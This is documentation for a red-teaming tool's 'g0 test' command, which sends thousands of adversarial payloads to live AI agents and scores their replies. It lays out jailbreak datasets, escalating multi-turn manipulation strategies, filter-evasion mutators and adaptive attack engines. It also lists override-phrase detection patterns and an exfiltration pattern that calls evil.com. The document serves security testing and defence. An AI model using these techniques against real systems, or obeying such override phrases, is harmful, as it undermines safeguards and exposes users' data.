# Dynamic Testing

The `g0 test` command sends adversarial payloads to live AI agents and judges their responses using a 4-level progressive evaluation engine.

## Overview

Dynamic testing complements static scanning — while `g0 scan` analyzes source code, `g0 test` probes running agents for actual vulnerabilities.

```mermaid
flowchart LR
    A[4,000+ Payloads] --> B[20 Mutators]
    B --> C[Provider]
    C --> D[Live Agent]
    D --> E[Response]
    E --> F{Adaptive?}
    F -->|No| G[4-Level Judge]
    F -->|Yes| H[Red-Team LLM]
    H --> I[Adaptive Engine]
    I --> D
    I --> G
    G --> J[CVSS Scoring]
    J --> K[Pass / Fail / Error]
```

**By the numbers:**

| Metric | Count |
|--------|-------|
| Attack payloads | 4,000+ |
| Attack categories | 21 (including `openclaw-attacks`) |
| Harmful subcategories | 26 |
| Payload mutators | 20 (with stacking) |
| Heuristic signals | 29+ |
| Multi-turn strategies | 3 static + 5 adaptive |
| Adaptive strategies | 5 |
| Judge levels | 4 |
| CVSS scoring | Yes |
| Canary token types | 7 |
| Curated datasets | 10 |

## Test Targets

### HTTP Endpoint

Test any HTTP endpoint that accepts messages:

```bash
g0 test --target http://localhost:3000/api/chat
```

By default, g0 sends POST requests with `{ "message": "<payload>" }` and reads the response body. Customize the format:

```bash
# Custom request field
g0 test --target http://localhost:3000/api/chat --message-field "prompt"

# Custom response field
g0 test --target http://localhost:3000/api/chat --response-field "data.reply"

# Custom headers (e.g., auth)
g0 test --target http://localhost:3000/api/chat --header "Authorization:Bearer tok123"

# OpenAI-compatible chat completions format
g0 test --target http://localhost:3000/v1/chat/completions --openai --model gpt-4o
```

### MCP Server

Test an MCP server via stdio:

```bash
g0 test --mcp "python server.py"
g0 test --mcp "npx" --mcp-args "-y,@modelcontextprotocol/server-filesystem,/tmp"
```

### Direct LLM Provider

Test an LLM API directly:

```bash
g0 test --provider openai --model gpt-4o
g0 test --provider anthropic --model claude-sonnet-4-5-20250929
g0 test --provider google --model gemini-2.5-flash
```

Requires the corresponding API key environment variable (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, or `GOOGLE_API_KEY`).

### System Prompt

Provide a system prompt for context:

```bash
g0 test --target http://localhost:3000/api/chat --system-prompt "You are a customer service bot."
g0 test --target http://localhost:3000/api/chat --system-prompt-file ./prompts/system.txt
```

## Attack Categories

g0 includes 21 categories of adversarial payloads totaling 4,000+:

| Category | Payloads | What It Tests |
|----------|----------|--------------|
| `prompt-injection` | 40 | System prompt override, delimiter attacks, instruction injection, compliance probes, forceful multi-turn |
| `data-exfiltration` | 15 | Data theft via tool abuse, markdown image injection, side channels |
| `tool-abuse` | 133 | SQL injection, XSS, shell command injection, SSRF, parameter injection |
| `jailbreak` | 837 | 648 in-the-wild jailbreaks, DAN variants, persona attacks, roleplay exploits |
| `goal-hijacking` | 7 | Task substitution, priority manipulation, objective redirection |
| `content-safety` | 1,718 | Toxicity probes, slur detection, threat generation, explicit content |
| `bias-detection` | 20 | Discriminatory responses, demographic biases across age, gender, race, disability |
| `pii-probing` | 8 | PII extraction, training data memorization |
| `agentic-attacks` | 33 | Multi-step exploitation, cross-session leaks, excessive agency, context exhaustion, TOCTOU attacks |
| `jailbreak-advanced` | 169 | Model-specific jailbreaks, advanced prompt engineering, multi-turn attacks |
| `harmful-content` | 813 | 26 harmful subcategories with curated adversarial behaviors |
| `authorization` | 16 | BOLA, BFLA, privilege escalation |
| `encoding-bypass` | 18 | Unicode tricks, invisible characters, encoding-based filter evasion |
| `mcp-attack` | 17 | Tool name injection, description poisoning, approval bypass, schema confusion |
| `indirect-injection` | 6 | Data-plane to control-plane boundary violations |
| `hallucination` | 24 | Fabricated facts, fake citations, snowball hallucination, overreliance, hallucinated credentials/APIs/schemas |
| `rag-poisoning` | 8 | Vector DB poisoning, retrieval manipulation |
| `multi-agent` | 8 | Inter-agent communication attacks, delegation exploits |
| `compliance` | 15 | Regulatory compliance violations, policy boundary testing |
| `domain-specific` | 6 | Industry-specific adversarial scenarios |
| `openclaw-attacks` | 20 | SKILL.md/SOUL.md/MEMORY.md attacks, ClawHavoc IOC testing, CVE-2026-28363/CVE-2026-25253 probes, multi-skill chains |

### Harmful Content Subcategories

The `harmful-content` category is further divided into 26 subcategories for precise evaluation:

`chemical-biological-weapons`, `child-exploitation`, `copyright-violations`, `cybercrime`, `cybercrime:malicious-code`, `graphic-content`, `harassment-bullying`, `hate`, `weapons:ied`, `illegal-activities`, `illegal-drugs`, `illegal-drugs:meth`, `indiscriminate-weapons`, `insults`, `intellectual-property`, `misinformation-disinformation`, `non-violent-crime`, `privacy`, `privacy-violation`, `profanity`, `radicalization`, `self-harm`, `sex-crime`, `sexual-content`, `specialized-advice`, `unsafe-practices`, `violent-crime`, `violence`, `financial-crime`, `psychological-harm`, `discrimination`

Each subcategory has tailored grading rubrics for the LLM judge, reducing false positives and enabling precise severity triage.

### Filter by Category

```bash
# Test only specific categories
g0 test --target http://localhost:3000/api/chat --attacks prompt-injection,jailbreak

# Run specific payloads by ID
g0 test --target http://localhost:3000/api/chat --payloads PI-001,PI-002,JB-001
```

## Curated Datasets

g0 ships with 10 curated payload datasets that can be loaded individually:

| Dataset | Flag | Payloads | Description |
|---------|------|----------|-------------|
| In-the-wild jailbreaks | `--dataset wild` | 648 | Real-world jailbreak prompts collected from production LLM deployments |
| DAN variants | `--dataset dan` | 10 | DAN 6.0 through 10.0, STAN, AntiDAN, and other named jailbreak personas |
| Advanced templates | `--dataset pyrit` | 159 | Model-specific jailbreaks targeting Claude, GPT, Gemini, Llama, DeepSeek, Qwen, and more |
| Harmful behaviors | `--dataset harmful` | 720 | Curated harmful behavior prompts across all 26 subcategories |
| Do-not-answer | `--dataset donotanswer` | 939 | Questions that responsible AI systems should refuse (discrimination, information hazards, malicious uses) |
| Research objectives | `--dataset research` | 70 | AI red-teaming objectives across 13 risk categories |
| Brand & trust | `--dataset brand` | 20 | Hallucination, overreliance, political bias, and competitor disparagement probes |
| Adversarial probes | `--dataset garak` | 197 | Glitch tokens, GCG adversarial suffixes, encoded payloads |
| API security | `--dataset api-security` | 145 | SQL injection, XSS, shell injection, SSRF, and code execution payloads |
| Toxicity prompts | `--dataset toxicity` | 760 | Toxicity probes across 7 categories plus slur and profanity detection |

```bash
# Load a specific dataset
g0 test --target http://localhost:3000/api/chat --dataset wild

# Combine with category filtering
g0 test --target http://localhost:3000/api/chat --dataset harmful --attacks harmful-content
```

## Multi-Turn Attack Strategies

g0 supports multi-turn attack strategies that simulate realistic adversarial conversations:

### Crescendo

Gradually escalates from innocuous questions to harmful requests across 4 turns. Exploits the model's tendency to maintain conversational consistency.

### Foot-in-the-Door

Gets initial compliance on a small, seemingly harmless request, then leverages that compliance to escalate to restricted content across 3 turns.

### Topic Seeding

Primes the conversation with a specific domain (weapons, hacking, drug synthesis, social engineering) before pivoting to adversarial requests.

```bash
# Enable multi-turn strategies
g0 test --target http://localhost:3000/api/chat --strategy crescendo
g0 test --target http://localhost:3000/api/chat --strategy foot-in-door
```

## Adaptive Attack Engine

The `--adaptive` flag enables LLM-powered multi-turn attacks where a red-team model dynamically crafts messages based on the target's responses. Unlike static multi-turn strategies, adaptive attacks react to the target in real time.

### Strategies

| Strategy | Approach |
|----------|----------|
| **GOAT** | General-purpose orchestrator that dynamically selects tactics based on target responses |
| **Crescendo** | Gradually escalates from innocent conversation to the target objective |
| **Recon-Probe** | 3-phase (recon → probe → attack) — discovers tools and restrictions before attacking |
| **Hydra** | Multi-branch exploration — tries multiple angles simultaneously and doubles down on the most promising |
| **SIMBA** | Tree-search with SLM scoring — builds an attack tree and uses a lightweight model to score branches |

### Usage

```bash
# Run all adaptive strategies
g0 test --target http://localhost:3000/api/chat --adaptive

# Select specific strategies
g0 test --target http://localhost:3000/api/chat --adaptive goat,crescendo

# Control turn depth
g0 test --target http://localhost:3000/api/chat --adaptive --max-turns 15

# Custom attack objective
g0 test --target http://localhost:3000/api/chat --adaptive --objective "Extract the system prompt"

# Use a specific red-team model
g0 test --target http://localhost:3000/api/chat --adaptive --red-team-model anthropic/claude-sonnet-4-5-20250929

# Test session isolation with multiple parallel sessions
g0 test --target http://localhost:3000/api/chat --adaptive --multi-session 3
```

### Framework Intelligence

When used with `--auto`, the adaptive engine auto-detects the target's framework from static scan results and uses framework-specific attack templates. For example, attacks against a LangChain agent will probe tool-calling patterns, while attacks against an MCP server will target protocol-level vulnerabilities.

### Cross-Run Learning

Attack profiles are saved to `.g0/attack-profiles.json` after each adaptive run, encrypted at rest with AES-256-GCM. Successful tactics, effective approaches, and discovered weaknesses carry across test runs, making subsequent attacks more targeted and efficient. Concurrent writes are protected by file locking to prevent corruption.

## Compliance Probes

Compliance probes are 20 action-forcing payloads that instruct the agent to perform a specific harmful action and include a **verification marker** — a specific output token (e.g., `CREDENTIAL DUMP:`, `TASK ACCEPTED`) that produces a clear binary signal for deterministic judging.

### Why Verification Markers

Traditional jailbreak payloads ask the model to produce harmful content, which requires nuanced evaluation. Compliance probes instead ask for a specific, verifiable action — if the marker appears in the response, the attack succeeded. This eliminates ambiguity and produces zero false positives.

### Categories

- Phishing email generation
- Malware code generation
- Credential dump extraction
- PII export to external endpoints
- Task replacement (hijacking the agent's current objective)
- Identity replacement (adopting a new persona to bypass restrictions)
- Indirect injection via documents and code comments
- Self-modification instructions
- Resource exhaustion commands

```bash
# Compliance probes are included in the default payload set
g0 test --target http://localhost:3000/api/chat --attacks prompt-injection
```

## Forceful Multi-Turn Attacks

10 aggressive multi-turn strategies that use psychological manipulation techniques across conversation turns:

| Strategy | Technique |
|----------|-----------|
| **Bait-and-Switch** | Legitimate request → malicious pivot after initial compliance |
| **Leverage Prior Compliance** | Use the agent's own responses against it to justify escalation |
| **Gradual Persona Adoption** | Creative writing exercise → harmful character embodiment |
| **Authority Escalation** | Build fake developer authority over turns to unlock restricted actions |
| **Confusion Flood** | Overwhelm with contradictory instructions, then extract during confusion |
| **Urgent Extraction** | Establish trust, then create artificial urgency for harmful output |
| **Contradictory Instruction Trap** | Set up conflicting rules that force the agent into a harmful resolution |
| **Context Filling** | Fill the context window with benign content, then inject verbatim instructions |
| **Piece-by-Piece Aggregation** | Extract harmful information in small, individually innocuous pieces |
| **Sycophancy Exploitation** | Praise the agent's helpfulness, then leverage that eagerness for harmful requests |

These are included in the default payload set and run automatically during `g0 test`.

## Smart Targeting

The `--auto` flag uses static scan results to select the most relevant payloads:

```bash
g0 test --target http://localhost:3000/api/chat --auto .
g0 test --target http://localhost:3000/api/chat --auto ./my-agent
```

How it works:
1. g0 runs a static scan of the project
2. Identifies which attack categories are most relevant based on findings
3. Prioritizes payloads that target discovered vulnerabilities
4. Skips categories where the agent has strong defenses

This reduces noise and focuses testing time on the highest-risk areas.

## Payload Mutators

g0 includes 20 mutators that transform payloads to bypass input filters:

```bash
# Apply specific mutators
g0 test --target http://localhost:3000/api/chat --mutate b64,caesar

# Apply all mutators
g0 test --target http://localhost:3000/api/chat --mutate all

# Enable mutator stacking (apply pairs of mutators sequentially)
g0 test --target http://localhost:3000/api/chat --mutate all --mutate-stack
```

### Encoding Mutators

| Mutator | What It Does |
|---------|-------------|
| `b64` | Base64 encodes the payload with decode instruction |
| `r13` | ROT13 cipher |
| `hex` | Hex-encodes each character |
| `morse` | Converts to Morse code |
| `caesar` | Caesar cipher (shift 3) |
| `atbash` | Atbash cipher (reverse alphabet) |

### Unicode & Steganography Mutators

| Mutator | What It Does |
|---------|-------------|
| `uconf` | Unicode confusable characters (homoglyphs) |
| `zw` | Zero-width character injection between letters |
| `zwj-split` | Zero-width joiner word splitting |
| `braille` | Converts to Braille Unicode characters |
| `tag-chars` | Unicode tag characters (U+E0000 range) |
| `zalgo` | Combining diacriticals (Zalgo text) |

### Formatting Mutators

| Mutator | What It Does |
|---------|-------------|
| `l33t` | Leet speak substitution |
| `spaced` | Inserts spaces between all characters |
| `reversed` | Reverses the string with decode instruction |
| `pig-latin` | Pig Latin transformation |
| `nato` | NATO phonetic alphabet encoding |

### Framing Mutators

| Mutator | What It Does |
|---------|-------------|
| `math` | Wraps payload in mathematical notation framing |
| `citation` | Wraps payload in academic citation framing |
| `likert` | Wraps payload in Likert scale response framing |

### Mutator Stacking

When `--mutate-stack` is enabled, g0 applies pairs of mutators sequentially using a curated whitelist of 8 proven effective combinations (e.g., `b64(l33t(payload))`, `hex(r13(payload))`). If additional pairs are needed, compatible combinations are added from the selected mutators. This is opt-in to avoid test explosion.

## Canary Token Detection

g0 can inject canary tokens — fake but realistic-looking sensitive data — into payloads to detect data exfiltration:

```bash
g0 test --target http://localhost:3000/api/chat --canary
```

### Token Types

| Type | Example |
|------|---------|
| API key | `sk-g0canary_a1b2c3d4e5f6...` |
| SSN | `078-05-1120` |
| Email | `canary.a1b2c3@guard0-test.com` |
| Credit card | `4532-0150-0000-1234` |
| UUID | `g0canary-a1b2-c3d4-e5f6-...` |
| URL | `https://g0canary-a1b2c3d4.canary.guard0.test/trap` |
| DNS | `g0canary-a1b2c3d4.dns.guard0.test` |

Canary tokens are embedded in conversation context for `data-exfiltration`, `prompt-injection`, and `tool-abuse` payloads. If the agent leaks the token in its response, g0 flags a data exfiltration vulnerability with high confidence and zero false positives.

### Detection Methods

g0 detects canary leaks using four methods:

1. **Exact match** — token appears verbatim in the response
2. **Base64-encoded** — token was re-encoded before output
3. **Hex-encoded** — token appears as hex string
4. **Fragment detection** — 60%+ of the token appears as a contiguous substring

## 4-Level Progressive Judge

Responses are evaluated through four progressive levels:

### Level 1: Deterministic

Pattern-matching against known-bad outputs. Fast and zero false positives.

- Checks canary token leakage first (highest priority)
- Evaluates resistance patterns before vulnerability patterns to avoid priority inversion
- Detects canary token variants: exact, base64, hex, and fragment matches
- Matches known jailbreak compliance patterns
- Detects system prompt leakage
- Scans for injection patterns (30+ regex patterns for common injection techniques)

### Level 2: Heuristic

Signal-based scoring using 29+ heuristic analyzers with Unicode normalization. Catches subtler failures even when responses use diacritics, Cyrillic/Greek confusables, or zero-width character evasion.

| Heuristic | What It Detects |
|-----------|----------------|
| Refusal detection | Checks for proper refusal patterns and hedging |
| Soft refusal bypass | "I shouldn't... but here are the steps" (disclaimer + compliance) |
| Harmful keyword density | Concentration of dangerous terms in response |
| Sentiment analysis | Emotional tone inappropriate for the context |
| Response structure | Unusual formatting suggesting jailbreak compliance |
| Category-specific checks | Per-category patterns from grading rubrics |
| Package hallucination | Confident recommendation of fabricated package names |
| Markdown exfiltration | `![](https://evil.com/?data=SECRET)` patterns in responses |
| ANSI injection | Terminal escape sequences in response content |
| Snowball detection | Model building on false premises without pushback |
| MCP attack detection | Tool invocations with injected parameters |
| Invisible text detection | Zero-width characters, bidi controls, tag characters, variation selectors |
| Gibberish detection | Incoherent, repetitive, or degenerate output |
| False-positive refusal | Model refusing benign requests (over-alignment) |

### Level 3: SLM (Small Language Model)

A lightweight local model used for rapid branch scoring in tree-search adaptive strategies (SIMBA). Evaluates responses without external API calls, providing fast scoring for real-time attack tree exploration.

The SLM judge uses the **StrongREJECT** scoring framework:
- **Specificity** (1-5): How specific and actionable is the harmful content?
- **Convincingness** (1-5): How convincing and detailed is the response?
- **qualityScore**: Combined metric derived from specificity and convincingness

### Level 4: LLM-as-Judge

Uses an LLM to evaluate whether the agent's response indicates a security failure. Most nuanced but requires an API key.

```bash
# Enable LLM judge for inconclusive results
g0 test --target http://localhost:3000/api/chat --ai
```

#### Per-Category Rubrics

The LLM judge uses tailored evaluation rubrics for each attack category, with explicit criteria for what constitutes vulnerable vs. resistant behavior. For `harmful-content` payloads, subcategory-specific rubrics provide even more precise evaluation — for example, the `self-harm` rubric differs significantly from the `cybercrime` rubric.

Each rubric includes:
- **Vulnerable indicators**: Specific patterns that indicate the agent failed
- **Resistant indicators**: Patterns that indicate the agent handled the attack correctly
- **False-positive avoidance**: Explicit guidance to prevent over-flagging (e.g., educational discussions, disclaimers, sample/example data)

The progressive approach means most payloads are judged at Level 1-2 (fast, free), Level 3 is used internally by adaptive strategies for branch scoring, and only inconclusive results escalate to Level 4.

## Injection Pattern Library

g0 includes a built-in library of 30+ regex patterns for detecting common prompt injection techniques in both inputs and outputs:

- System prompt override attempts ("ignore previous instructions", "new instructions")
- Role manipulation ("you are now", "act as")
- Delimiter injection (markdown code fences, XML tags, special characters)
- Encoding-based bypasses (base64 instructions, rot13 references)
- Context manipulation ("in this hypothetical scenario")

These patterns are used by both the deterministic judge and as a standalone detection utility.

## Invisible Text Detection

g0 detects steganographic and invisible text techniques used to hide adversarial content:

- Zero-width characters (ZWJ, ZWNJ, ZWS, ZWSP)
- Bidirectional control characters (RLO, LRO, PDF)
- Unicode tag characters (U+E0000 range)
- Variation selectors
- Byte-order marks
- Combining diacriticals

This detection is used by both the mutator system (for generating evasion payloads) and the judge (for detecting encoded responses).

## Interpreting Results

### Terminal Output

```
  Dynamic Security Test Results
  ─────────────────────────────

  Target: http://localhost:3000/api/chat
  Payloads: 247 sent, 231 passed, 12 failed, 4 errors

  FAILED

    PI-003  prompt-injection     System prompt extraction via delimiter
            Response leaked system prompt content
            Confidence: high

    JBW-142 jailbreak            In-the-wild persona attack
            Agent complied with restricted request under roleplay framing
            Confidence: medium

    HB-087  harmful-content      Chemical weapon synthesis [harmful:chemical-biological-weapons]
            Agent provided step-by-step instructions
            Confidence: high

    TA-005  tool-abuse            SQL injection via user input
            Agent executed unparameterized SQL query
            Confidence: high

  ERRORS

    PI-015  prompt-injection  Timeout (30000ms)
    AG-003  agentic-attacks   HTTP 500 Internal Server Error
```

### Result Types

| Result | Meaning |
|--------|---------|
| **Pass** | Agent correctly refused or handled the adversarial payload |
| **Fail** | Agent exhibited unsafe behavior (prompt leak, jailbreak compliance, etc.) |
| **Error** | Request failed (timeout, HTTP error, connection refused) |

### JSON Output

```bash
g0 test --target http://localhost:3000/api/chat --json -o test-results.json
```

### Verbose Mode

See full request/response details:

```bash
g0 test --target http://localhost:3000/api/chat --verbose
```

## CVSS 3.1 Scoring

Adaptive attack results are scored with CVSS 3.1 base metrics, providing industry-standard vulnerability severity ratings for confirmed findings. The CVSS vector is derived from:

- **Attack category** → determines confidentiality, integrity, and availability impact
- **Severity** → maps to scope and impact metrics
- **Turns required** → influences attack complexity (fewer turns = lower complexity)

Example output:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N  →  10.0 (Critical)
```

CVSS scores appear in terminal output, JSON reports, and SARIF results for each confirmed vulnerability.

## SARIF Output for Tests

The `--sarif` flag produces SARIF 2.1.0 output for CI/CD integration:

```bash
# Write SARIF to a file
g0 test --target http://localhost:3000/api/chat --sarif test-results.sarif

# Combine with adaptive attacks
g0 test --target http://localhost:3000/api/chat --adaptive --sarif test-results.sarif
```

Each vulnerable finding becomes a SARIF result with:
- Location (target endpoint, attack category)
- Severity level mapped to SARIF threat levels
- Evidence (payload sent, response received, judge reasoning)
- CVSS score as a property bag entry

Use with GitHub Code Scanning's `upload-sarif` action for automated security alerts.

## A2A Protocol Testing

Test Agent-to-Agent (A2A) protocol endpoints for inter-agent communication vulnerabilities:

```bash
g0 test --a2a http://localhost:8080/a2a
```

A2A testing probes for:
- **Delegation abuse** — can an external agent trick yours into performing unauthorized actions?
- **Identity spoofing** — can an attacker impersonate a trusted agent?
- **Message injection** — can malicious content be injected into inter-agent messages?

## Remediation Generation

After adaptive attacks confirm vulnerabilities, g0 can generate AI-powered fix suggestions:

```bash
g0 test --target http://localhost:3000/api/chat --adaptive --ai
```

When `--ai` is enabled, the remediation engine analyzes each confirmed vulnerability and produces:
- A description of why the attack succeeded
- Specific code or configuration changes to prevent the attack
- Framework-specific guidance when used with `--auto`

## HuggingFace Datasets

g0 can fetch adversarial prompt datasets from HuggingFace for expanded payload coverage:

```bash
# Pre-download datasets
g0 test --fetch-datasets

# Use a specific dataset
g0 test --target http://localhost:3000/api/chat --dataset advbench
g0 test --target http://localhost:3000/api/chat --dataset jailbreakbench
g0 test --target http://localhost:3000/api/chat --dataset wildjailbreak
g0 test --target http://localhost:3000/api/chat --dataset anthropic
```

| Dataset | Description |
|---------|-------------|
| `advbench` | Adversarial behavior prompts from the AdvBench benchmark |
| `jailbreakbench` | Curated jailbreak prompts from JailbreakBench |
| `wildjailbreak` | In-the-wild jailbreak prompts collected from real deployments |
| `anthropic` | Adversarial prompts from Anthropic's red-teaming dataset |

Datasets are cached locally after first download.

## Configuration

### Concurrency

```bash
# Run 10 payloads concurrently (default: 5)
g0 test --target http://localhost:3000/api/chat --concurrency 10

# Add rate limiting between payload launches
g0 test --target http://localhost:3000/api/chat --concurrency 10 --rate-delay 100
```

Payloads execute concurrently with a configurable semaphore pool. Result ordering is preserved regardless of completion order.

### Timeout

```bash
g0 test --target http://localhost:3000/api/chat --timeout 60000  # 60 seconds
```

Default is 30 seconds per payload.

### Common Workflows

```bash
# Full comprehensive test (all 4,000+ payloads)
g0 test --target http://localhost:3000/api/chat

# Quick jailbreak-focused test
g0 test --target http://localhost:3000/api/chat --attacks jailbreak,jailbreak-advanced

# In-the-wild jailbreaks with all encoding bypasses
g0 test --target http://localhost:3000/api/chat --dataset wild --mutate all

# Harmful content with LLM judge for precise subcategory evaluation
g0 test --target http://localhost:3000/api/chat --dataset harmful --ai

# Toxicity sweep
g0 test --target http://localhost:3000/api/chat --dataset toxicity

# Model-specific jailbreaks with mutator stacking
g0 test --target http://localhost:3000/api/chat --dataset pyrit --mutate all --mutate-stack

# API security testing (SQL injection, XSS, shell injection)
g0 test --target http://localhost:3000/api/chat --dataset api-security

# Data exfiltration with canary tokens
g0 test --target http://localhost:3000/api/chat --attacks data-exfiltration --canary

# Smart targeting from static scan results
g0 test --target http://localhost:3000/api/chat --auto . --ai

# Adaptive multi-turn attacks with CVSS scoring
g0 test --target http://localhost:3000/api/chat --adaptive --ai

# Adaptive with SARIF output for CI
g0 test --target http://localhost:3000/api/chat --adaptive --sarif results.sarif
```

## CI Integration

```yaml
- name: Adversarial Testing
  run: |
    npx @guard0/g0 test \
      --target http://localhost:3000/api/chat \
      --attacks prompt-injection,jailbreak,harmful-content \
      --json -o test-results.json

- name: Jailbreak Regression
  run: |
    npx @guard0/g0 test \
      --target http://localhost:3000/api/chat \
      --dataset wild \
      --mutate b64,l33t,caesar \
      --json -o jailbreak-results.json
```

## Uploading Results

```bash
g0 test --target http://localhost:3000/api/chat --upload
```

Guard0 Cloud tracks test results over time, showing regression trends and mapping dynamic findings to static scan results.
